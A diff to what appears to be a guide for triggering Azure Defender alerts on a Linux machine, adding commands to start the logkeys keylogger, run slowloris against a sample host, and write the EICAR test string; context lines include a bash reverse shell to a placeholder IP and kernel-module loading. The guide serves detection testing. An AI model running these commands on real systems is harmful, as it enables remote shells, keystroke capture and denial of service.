@@ -120,6 +120,13 @@ bash -i>& /dev/tcp/1.2.3.4/1234 0>&1
 # Add and remove kernel module
 # sudo insmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
 # sudo rmmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
+
+# Run questionable tools
+logkeys --start
+perl slowloris.pl -dns server.contoso.com
+
+# Store malware file
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ./EICAR.com
 ```
 
 Check alert in Azure Defender.
